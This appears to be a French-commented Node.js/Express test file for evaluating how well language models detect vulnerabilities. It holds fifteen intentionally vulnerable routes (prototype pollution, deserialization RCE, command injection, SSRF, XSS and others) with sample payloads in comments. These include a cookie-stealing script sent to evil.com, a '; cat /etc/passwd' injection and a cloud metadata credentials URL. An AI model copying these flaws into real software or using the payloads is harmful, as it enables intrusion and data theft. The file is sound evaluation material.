/**
 * FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES (Node.js / Express)
 * Usage : évaluation LLM — détection de failles JavaScript / Node.js
 * Couvre OWASP Top 10:2025 + vulnérabilités spécifiques Node.js / Express
 * CVE de référence 2024-2026 inclus
 * NE PAS déployer en production.
 */

'use strict';

const express    = require('express');
const mongoose   = require('mongoose');
const jwt        = require('jsonwebtoken');
const fs         = require('fs');
const { exec }   = require('child_process');
const serialize  = require('node-serialize');  // vuln library
const app        = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ═══════════════════════════════════════════════════════════════════════
// 1. PROTOTYPE POLLUTION → RCE
// OWASP A05:2025 – Injection | CVSS 9.8
// CVE-2026-41690 : i18next-http-middleware (CVSS 8.6 — publié 2026-05-08)
// CVE-2024-21505 : web3-utils prototype pollution
// CVE-2025-57820 : devalue prototype pollution
// ═══════════════════════════════════════════════════════════════════════
// Payload : {"__proto__": {"admin": true}}
// Payload RCE (si vm.runInNewContext utilisé) :
// {"__proto__": {"NODE_OPTIONS": "--require /proc/self/fd/0", "env": {"...": "..."}}}
function merge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object') {
            merge(target[key], source[key]); // récursion sans vérification de '__proto__'
        } else {
            target[key] = source[key];       // Object.prototype pollué
        }
    }
    return target;
}

app.post('/api/settings', (req, res) => {
    const userSettings = {};
    merge(userSettings, req.body);           // pollution de Object.prototype
    res.json({ ok: true });
});

// Lodash _.merge() vulnérable (avant 4.17.21)
// const _ = require('lodash');
// _.merge({}, JSON.parse(req.body)); // CVE-2021-23337 pattern

// ═══════════════════════════════════════════════════════════════════════
// 2. NODE-SERIALIZE — RCE via désérialisation
// OWASP A08:2025 – Software or Data Integrity Failures | CVSS 9.8
// CVE-2017-5941 — toujours utilisé dans des projets legacy en 2026
// ═══════════════════════════════════════════════════════════════════════
// Payload : {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',console.log)}()"}
app.get('/restore', (req, res) => {
    const cookieData = req.cookies?.session || '';
    const userData = serialize.unserialize(
        Buffer.from(cookieData, 'base64').toString()  // RCE si payload IIFE
    );
    res.json(userData);
});

// ═══════════════════════════════════════════════════════════════════════
// 3. SQL / NoSQL INJECTION — MongoDB
// OWASP A05:2025 – Injection | CVSS 9.8
// ═══════════════════════════════════════════════════════════════════════
// Payload NoSQL : {"username": {"$gt": ""}, "password": {"$gt": ""}}
// → tous les utilisateurs matchent → bypass d'authentification
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // NoSQL injection : les objets passent directement dans le query
    const user = await mongoose.model('User').findOne({
        username: username,  // si username = {"$regex": ".*"} → dump de tous les users
        password: password
    });

    if (user) res.json({ token: 'xxx' });
    else res.status(401).json({ error: 'Invalid credentials' });
});

// ═══════════════════════════════════════════════════════════════════════
// 4. COMMAND INJECTION — child_process.exec
// OWASP A05:2025 – Injection | CVSS 9.8
// ═══════════════════════════════════════════════════════════════════════
// Payload : "; cat /etc/passwd #"
app.get('/ping', (req, res) => {
    const host = req.query.host || '';
    exec(`ping -c 1 ${host}`, (err, stdout) => {   // injection shell
        res.send(stdout);
    });
});

// ═══════════════════════════════════════════════════════════════════════
// 5. PATH TRAVERSAL — fs.readFile sans sanitization
// OWASP A01:2025 – Broken Access Control | CVSS 7.5
// ═══════════════════════════════════════════════════════════════════════
// Payload : ../../../../etc/shadow
app.get('/file', (req, res) => {
    const filename = req.query.name || '';
    fs.readFile(`/var/www/uploads/${filename}`, (err, data) => {
        if (!err) res.send(data);
        else res.status(404).end();
    });
});

// ═══════════════════════════════════════════════════════════════════════
// 6. XSS — injection dans le rendu HTML sans échappement
// OWASP A05:2025 – Injection | CVSS 7.4
// ═══════════════════════════════════════════════════════════════════════
app.get('/search', (req, res) => {
    const query = req.query.q || '';
    // Payload : <script>fetch('https://evil.com/?c='+document.cookie)</script>
    res.send(`<html><body>
        <h1>Résultats pour : ${query}</h1>
    </body></html>`);  // pas d'échappement HTML
});

// ═══════════════════════════════════════════════════════════════════════
// 7. JWT — algorithme "none" accepté + secret faible
// OWASP A07:2025 – Authentication Failures | CVSS 9.1
// ═══════════════════════════════════════════════════════════════════════
const JWT_SECRET = 'secret';  // secret trivial — brute-force en <1s

app.get('/profile', (req, res) => {
    const token = req.headers.authorization?.split(' ')[1] || '';
    try {
        // algorithms non spécifié → accepte 'none' et RS256→HS256 confusion
        const decoded = jwt.verify(token, JWT_SECRET);
        res.json(decoded);
    } catch {
        res.status(401).end();
    }
});

// ═══════════════════════════════════════════════════════════════════════
// 8. OPEN REDIRECT
// OWASP A01:2025 – Broken Access Control | CVSS 6.1
// ═══════════════════════════════════════════════════════════════════════
app.get('/redirect', (req, res) => {
    const url = req.query.url || '/';
    res.redirect(url);  // aucune validation — ?url=https://evil.com/phishing
});

// ═══════════════════════════════════════════════════════════════════════
// 9. SSRF — axios/node-fetch avec URL non validée
// OWASP A01:2025 – Broken Access Control (SSRF consolidé ici en 2025)
// ═══════════════════════════════════════════════════════════════════════
const https = require('https');
app.get('/fetch', (req, res) => {
    const url = req.query.url || '';
    // Payload : http://169.254.169.254/latest/meta-data/iam/security-credentials/
    // Payload : http://localhost:27017 (MongoDB sans auth)
    // Payload : http://internal-k8s-api:6443/api/v1/secrets
    https.get(url, (response) => {
        let data = '';
        response.on('data', chunk => data += chunk);
        response.on('end', () => res.send(data));
    });
});

// ═══════════════════════════════════════════════════════════════════════
// 10. ReDoS — Regular Expression Denial of Service
// OWASP A06:2025 – Insecure Design | CVSS 7.5
// Payload email (50+ chars) : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@
// ═══════════════════════════════════════════════════════════════════════
app.post('/validate-email', (req, res) => {
    const email = req.body.email || '';
    // Regex catastrophique — backtracking exponentiel
    const emailRegex = /^([a-zA-Z0-9])(([-.]|[_]+)?([a-zA-Z0-9]+))*(@)([a-zA-Z0-9\-]+)(\.([a-zA-Z]{2,})){1,2}$/;
    const valid = emailRegex.test(email);  // peut bloquer l'event loop pendant des secondes
    res.json({ valid });
});

// ═══════════════════════════════════════════════════════════════════════
// 11. MASS ASSIGNMENT — Mongoose Model
// OWASP A01:2025 – Broken Access Control | CVSS 8.1
// ═══════════════════════════════════════════════════════════════════════
const UserSchema = new mongoose.Schema({
    username: String,
    email: String,
    role: { type: String, default: 'user' },  // ne devrait pas être modifiable
    isAdmin: { type: Boolean, default: false }
});
const User = mongoose.model('User', UserSchema);

app.post('/update-profile', async (req, res) => {
    const userId = req.session?.userId;
    // req.body peut contenir role: "admin", isAdmin: true
    await User.findByIdAndUpdate(userId, req.body);  // mass assignment
    res.json({ ok: true });
});

// ═══════════════════════════════════════════════════════════════════════
// 12. GRAPHQL — Introspection + DoS par requêtes imbriquées
// OWASP A02:2025 – Security Misconfiguration
// ═══════════════════════════════════════════════════════════════════════
// Configuration GraphQL sans :
// - désactivation de l'introspection en production
// - limite de profondeur de requête
// - limite de complexité
// - rate limiting
//
// Introspection révèle le schéma complet (types, champs, mutations)
// Query DoS : { user { friends { friends { friends { friends { ... } } } } } }
// Batch attack : [{query: "..."}, {query: "..."}, ...] × 1000 requêtes en un seul POST

// ═══════════════════════════════════════════════════════════════════════
// 13. SUPPLY CHAIN — OWASP A03:2025 (NOUVELLE CATÉGORIE 2025)
// Software Supply Chain Failures
// ═══════════════════════════════════════════════════════════════════════
// package.json vulnérable (simulé) :
// {
//   "dependencies": {
//     "express": "3.x",              // EOL — multiple CVEs
//     "lodash": "^4.17.4",           // CVE-2021-23337 — prototype pollution
//     "axios": "^0.21.0",            // CVE-2021-3749 — ReDoS
//     "jsonwebtoken": "^8.5.0",      // CVE-2022-23529 — JWT verification bypass
//     "node-fetch": "^2.6.0",        // CVE-2022-0235 — information exposure
//     "ejs": "^3.1.6",               // CVE-2022-29078 — RCE via template injection
//     "got": "^11.8.2"               // CVE-2022-33987 — open redirect
//   }
// }

// ═══════════════════════════════════════════════════════════════════════
// 14. MISHANDLING OF EXCEPTIONAL CONDITIONS — OWASP A10:2025
// Nouvelle catégorie 2025 — Fail Open, erreurs silencieuses
// ═══════════════════════════════════════════════════════════════════════
async function authenticate(token) {
    try {
        return await verifyToken(token);
    } catch (err) {
        // Fail open : si le service d'auth est indisponible → accès autorisé
        console.log('Auth service error:', err.message);
        return { userId: null, role: 'guest', bypass: true }; // DANGEROUS
    }
}

app.use('/admin', async (req, res, next) => {
    const token = req.headers.authorization || '';
    const user = await authenticate(token); // si auth service timeout → bypass admin
    if (user.role === 'admin' || user.bypass) next(); // fail open
    else res.status(403).end();
});

async function verifyToken(token) {
    throw new Error('Auth service unreachable'); // simule un timeout
}

// ═══════════════════════════════════════════════════════════════════════
// 15. INSECURE DIRECT OBJECT REFERENCE (IDOR) + BOLA
// OWASP A01:2025 – Broken Access Control | CVSS 8.6
// ═══════════════════════════════════════════════════════════════════════
app.get('/api/orders/:id', async (req, res) => {
    const orderId = req.params.id;
    const order = await mongoose.model('Order').findById(orderId);
    // aucune vérification que req.session.userId === order.userId
    res.json(order);
});

app.listen(3000);
